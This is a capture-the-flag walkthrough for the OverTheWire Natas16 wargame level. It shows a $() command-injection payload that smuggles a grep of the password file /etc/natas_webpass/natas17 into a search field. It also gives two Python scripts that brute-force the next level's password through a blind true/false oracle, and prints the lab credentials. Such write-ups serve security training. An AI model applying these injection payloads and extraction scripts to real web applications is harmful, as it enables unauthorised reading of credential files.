# Natas16

## Level Description
- **Username**: natas16
- **Password**: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
- **URL**: http://natas16.natas.labs.overthewire.org

## Method of Solving
![image-1](https://github.com/dungcngo/hackerhorse/blob/main/walkthroughs/overthewire/natas/natas16/image-1.png)

Here is the PHP code for this challenge:

![image-2](https://github.com/dungcngo/hackerhorse/blob/main/walkthroughs/overthewire/natas/natas16/image-2.png)

We have a search field used to find words containing a pattern we can  specify. We also have a filter on certain characters. However, we still can inject command. The `$, (, )` are not filtered so we can use `$()` as command substituation.
```bash
$(grep -E ^x.* /etc/natas_webpass/natas17)
```
Still, we discoverd the we could not directly read the command substitution but we could have boolean answer from the script. Here is how it works:
- If you submit a random letter in the search field you'll get a result.
- if you submit an empty field you get nothing.

So, if you inject `$(grep -E ^x.* /etc/natas_webpass/natas17)`:
- No results = True
- Results = False

We can run these two scripts to solve it (`natas_brute_force.py` and `natas_brute_force_1.py`)
```bash
#!/bin/python3

import requests
import sys
from string import digits, ascii_lowercase, ascii_uppercase

charset = ascii_lowercase + ascii_uppercase + digits
s = requests.Session()
s.auth = ('natas16', 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo')

password = ""
#We assume that the password is 32 chars
while len(password) < 32:
	for char in charset:
		payload = {'needle': '$(grep -E ^%s.* /etc/natas_webpass/natas17)' % (password + char)}
		r = s.get('http://natas16.natas.labs.overthewire.org/index.php', params = payload)
		
		if len(r.text) == 1105:
			sys.stdout.write(char)
			sys.stdout.flush()
			password += char
			break

```
```bash
#!/bin/python3
 
import requests
from requests.auth import HTTPBasicAuth
 
url = 'http://natas16.natas.labs.overthewire.org/?needle='
s = requests.Session()
s.auth = HTTPBasicAuth("natas16", "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo")
 
passfile17 = '/etc/natas_webpass/natas17'
prefix = 'tested'
 
def get_password_chars():
    filtered = ''
    chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
 
    print('Looking for password char set...')
    for char in chars:
        input_text = f'^{prefix}$(grep {char} {passfile17})'
        if is_hit(input_text):
            filtered += char
            print(f'The password contains: {filtered}')
 
    return filtered
 
def get_password(filtered):
    password = ''
    for i in range(32):
        print(f'Looking for the position {i}...')
 
        for char in filtered:
            input_text = f'^{prefix}$(grep ^{password}{char} {passfile17})'
            if is_hit(input_text):
                password += char
                print(password)
                break
 
    return password
 
def is_hit(data):
    resp = s.get(f'{url}{data}')
    return resp and prefix not in resp.text
 
# Step 1: Find out what chars the password contains
password_chars = get_password_chars()
 
# Step 2: Find out the password by ordering the chars found in step 1
password = get_password(password_chars)
print(f'The password is: {password}')
```
We should get the password for next level.
```bash
The password is: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
```

***You are welcome!***
